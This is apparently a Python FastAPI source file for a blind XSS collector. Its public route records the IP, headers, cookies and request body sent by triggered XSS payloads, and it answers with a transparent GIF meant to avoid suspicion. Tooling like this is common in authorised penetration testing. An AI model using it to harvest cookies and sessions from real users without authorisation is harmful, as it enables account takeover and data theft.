"""Blind XSS collector endpoints - public routes for capturing XSS hits."""

from typing import Optional

from fastapi import APIRouter, Depends, Request, Response
from sqlalchemy.orm import Session

from app.core.database import get_db
from app.models.blind_xss_hit import BlindXssHit
from app.services.blind_xss_service import BlindXssService

router = APIRouter(prefix="/xss", tags=["blind-xss"])


@router.api_route(
    "/{token}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
)
async def collect_xss_hit(
    token: str,
    request: Request,
    db: Session = Depends(get_db),
):
    """
    Public endpoint for collecting blind XSS hits.
    Captures all request details when a blind XSS payload is triggered.
    """
    try:
        # Extract request details
        ip_address = request.client.host if request.client else "unknown"
        user_agent = request.headers.get("user-agent")
        referrer = request.headers.get("referer")
        url_path = str(request.url)

        # Get all headers
        headers = dict(request.headers)

        # Get cookies if present
        cookies = dict(request.cookies) if request.cookies else {}

        # Get raw request body for POST/PUT/PATCH
        raw_request = None
        if request.method in ["POST", "PUT", "PATCH"]:
            try:
                body = await request.body()
                raw_request = body.decode("utf-8", errors="ignore") if body else None
            except Exception:
                raw_request = None

        # Record the hit
        hit = BlindXssService.record_hit(
            db=db,
            token=token,
            ip_address=ip_address,
            user_agent=user_agent,
            headers=headers,
            cookies=cookies,
            referrer=referrer,
            url_path=url_path,
            method=request.method,
            raw_request=raw_request,
        )

        if hit:
            # Return a 1x1 transparent GIF to avoid suspicion
            gif_data = b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
            return Response(content=gif_data, media_type="image/gif")
        else:
            # Token not found - return 404
            return Response(status_code=404, content="Not Found")

    except Exception as e:
        # Log error but don't expose it
        print(f"Blind XSS collection error: {e}")
        return Response(status_code=500, content="Internal Server Error")


@router.get("/{token}/info")
async def get_token_info(token: str, db: Session = Depends(get_db)):
    """
    Get information about a blind XSS token (for debugging).
    This endpoint is public but only returns basic info.
    """
    hit = db.query(BlindXssHit).filter(BlindXssHit.token == token).first()
    if not hit:
        return {"error": "Token not found"}

    return {
        "token": token,
        "created": hit.triggered_at.isoformat() if hit.triggered_at else None,
        "has_payload_opportunity": hit.payload_opportunity_id is not None,
    }
